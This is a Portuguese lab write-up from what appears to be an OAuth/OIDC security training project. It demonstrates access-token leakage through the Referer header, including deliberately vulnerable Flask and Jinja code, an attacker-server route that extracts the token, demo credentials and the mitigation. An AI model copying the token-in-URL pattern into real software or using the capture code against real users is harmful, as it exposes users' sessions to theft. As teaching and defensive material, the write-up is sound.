# A-06 — Token Leakage via Referrer Header

## Descrição

Quando um access token OAuth 2.0 / OIDC é colocado como query parameter na URL
(ex: `/dashboard?token=eyJ...`), o browser inclui automaticamente essa URL completa
no header `Referer` quando carrega recursos externos (imagens, scripts, tracking pixels).

Um atacante que controle um servidor externo referenciado pela página recebe o token
sem qualquer interação da vítima.

---

## Pré-requisitos

- SP1 a correr em `http://localhost:5001`
- Attacker Server a correr em `http://localhost:9999`
- `VULN_A06_REFERRER_LEAK = True` em `sp1/config.py`

---

## Análise do Código

### 1. Flag de controlo — `sp1/config.py`

```python
# True  = sistema VULNERÁVEL
# False = mitigação ATIVA
VULN_A06_REFERRER_LEAK = True
```

Esta flag é importada globalmente em `sp1/app.py` com `from config import *`
e consultada em dois pontos distintos: no callback OIDC e no template HTML.

---

### 2. Callback OIDC — `sp1/app.py` (rota `/callback`)

Após o Keycloak devolver o authorization code, o SP1 troca-o pelo token.
É aqui que a vulnerabilidade é introduzida:

```python
@app.route("/callback")
def callback():
    token = oauth.keycloak.authorize_access_token()   # troca code → tokens
    user_info = token.get("userinfo")

    # ... (A-09 session fixation — ver a09_session_fixation.md)

    session["user"]         = user_info
    session["access_token"] = token.get("access_token")

    # ---- A-06: Token in URL ----
    if VULN_A06_REFERRER_LEAK:
        # VULNERÁVEL: o access_token é exposto na URL como query parameter
        # Qualquer recurso externo nesta página vai receber o token via Referer
        access_token = token.get("access_token")
        return redirect(url_for("dashboard", token=access_token))
        #                                    ^^^^^^^^^^^^^^^^^^^^^^^^
        #                       gera: /dashboard?token=eyJhbGci...

    # MITIGADO: redireciona para / sem token na URL
    # O token fica apenas na sessão server-side (inacessível ao browser)
    return redirect(url_for("index"))
```

**Com `True`:** a resposta HTTP tem `Location: /dashboard?token=eyJhbGci...`
O token viaja na URL e fica visível em logs, histórico do browser e headers.

**Com `False`:** a resposta tem `Location: /` sem qualquer token.
O access token permanece apenas em `session["access_token"]` — no servidor.

---

### 3. Template do dashboard — `sp1/templates/home.html`

A segunda metade da vulnerabilidade está no template. Quando a página
`/dashboard?token=...` é renderizada, carrega recursos do servidor do atacante:

```html
{% if vuln_a06 and token_in_url %}

  <!--
    VULNERÁVEL: referrerpolicy="unsafe-url" força o browser a incluir
    a URL completa (com o token) no header Referer, mesmo em pedidos
    cross-origin (porta 5001 → porta 9999).

    Sem este atributo, o browser aplica strict-origin-when-cross-origin
    por defeito e envia apenas "http://localhost:5001/" — sem o token.
  -->
  <img src="{{ attacker_url }}/pixel.gif"
       referrerpolicy="unsafe-url"
       width="1" height="1">

  <script>
    // O fetch também envia o Referer com referrerPolicy: "unsafe-url"
    fetch("{{ attacker_url }}/log?source=sp1", {
      referrerPolicy: "unsafe-url",
      mode: "no-cors"
    });
  </script>

{% endif %}
```

A condição `{% if vuln_a06 and token_in_url %}` garante que o recurso
externo só é carregado quando **ambas** as condições são verdadeiras:
- a flag está activa (`vuln_a06=True` passado pela rota `/dashboard`)
- o token está presente na URL (`token_in_url` não é vazio)

---

### 4. Rota do dashboard — `sp1/app.py`

```python
@app.route("/dashboard")
def dashboard():
    user = current_user()
    if not user:
        return redirect(url_for("login"))

    token_in_url = request.args.get("token", "")
    #              ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
    #              lê o token da query string da URL

    return render_template(
        "home.html",
        user=user,
        token_in_url=token_in_url,   # passado ao template
        vuln_a06=VULN_A06_REFERRER_LEAK,
        attacker_url=ATTACKER_BASE_URL,
    )
```

---

### 5. Servidor do atacante — `attacker/app.py`

O attacker server recebe o pedido do browser da vítima e extrai o token
do header `Referer`:

```python
@app.route("/pixel.gif")
def pixel():
    referer = request.headers.get("Referer", "")
    # Referer recebido: "http://localhost:5001/dashboard?token=eyJhbGci..."

    token = ""
    if "token=" in referer:
        token = referer.split("token=")[1].split("&")[0]
        # token = "eyJhbGci..."  ← token completo extraído

    log_event("A-06: Token via Referer", "pixel.gif",
              f"Referer: {referer}\n  TOKEN CAPTURADO: {token[:80]}...",
              token=token)   # token completo guardado para copiar
    ...
```

---

## Fluxo Completo do Ataque

```
VÍTIMA (browser)              SP1 :5001              ATACANTE :9999
      │                          │                         │
      │── GET /login ────────────►│                         │
      │◄── redirect Keycloak ─────│                         │
      │                          │                         │
      │  [login no Keycloak]      │                         │
      │                          │                         │
      │── GET /callback?code=X ──►│                         │
      │                          │── POST token exchange ──►Keycloak
      │                          │◄── access_token=eyJ... ──│
      │                          │                         │
      │◄── 302 /dashboard?token=eyJ... (VULN: token na URL)│
      │                          │                         │
      │── GET /dashboard?token=eyJ... ──►│                 │
      │◄── 200 HTML (com <img src=:9999/pixel.gif>) ────────│
      │                          │                         │
      │── GET /pixel.gif ──────────────────────────────────►│
      │   Referer: localhost:5001/dashboard?token=eyJ...    │
      │                          │          ^^^^^^^^^^^^^^  │
      │                          │       TOKEN ROUBADO      │
```

---

## Passos da Demonstração

### 1. Verificar configuração vulnerável

```python
# sp1/config.py
VULN_A06_REFERRER_LEAK = True
```

### 2. Abrir o Attacker Dashboard

Abre `http://localhost:9999/` — deixa a aba aberta.

### 3. Fazer login no Portal A

Acede a `http://localhost:5001` e faz login com `alice` / `alice123`.

### 4. Observar o token capturado

O dashboard mostra o evento A-06 com o token completo.
Usa o botão **📋 Copiar Token** e corre:

```bash
python attacks/a06_use_token.py "eyJhbGci..."
```

Resultado: dados completos de alice devolvidos pelo Keycloak.

---

## Mitigação — Análise do Código

```python
# sp1/config.py
VULN_A06_REFERRER_LEAK = False
```

**Efeito 1 — callback não coloca o token na URL:**

```python
# sp1/app.py — /callback
if VULN_A06_REFERRER_LEAK:
    access_token = token.get("access_token")
    return redirect(url_for("dashboard", token=access_token))
    # ↑ este bloco NÃO é executado com False

return redirect(url_for("index"))
# ↑ redireciona para / — token fica apenas na sessão
```

**Efeito 2 — template não carrega o recurso externo:**

```html
{% if vuln_a06 and token_in_url %}
  <!-- ↑ vuln_a06=False → bloco ignorado → pixel.gif nunca é carregado -->
{% endif %}
```

**Efeito 3 — header `Referrer-Policy` adicionado** (a implementar no Passo 7):

```python
@app.after_request
def set_security_headers(response):
    if not VULN_A06_REFERRER_LEAK:
        response.headers["Referrer-Policy"] = "no-referrer"
    return response
```

Com `no-referrer`, mesmo que um recurso externo seja carregado,
o browser envia o header `Referer` vazio — o token nunca chega ao atacante.

---

## Referências

- [OWASP — Token Leakage](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/05-Testing_for_Cross_Site_Request_Forgery)
- [RFC 7636 — PKCE](https://datatracker.ietf.org/doc/html/rfc7636)
- [OAuth 2.0 Security BCP — Section 4.2.4](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-security-topics#section-4.2.4)
- [MDN — Referrer-Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referrer-Policy)
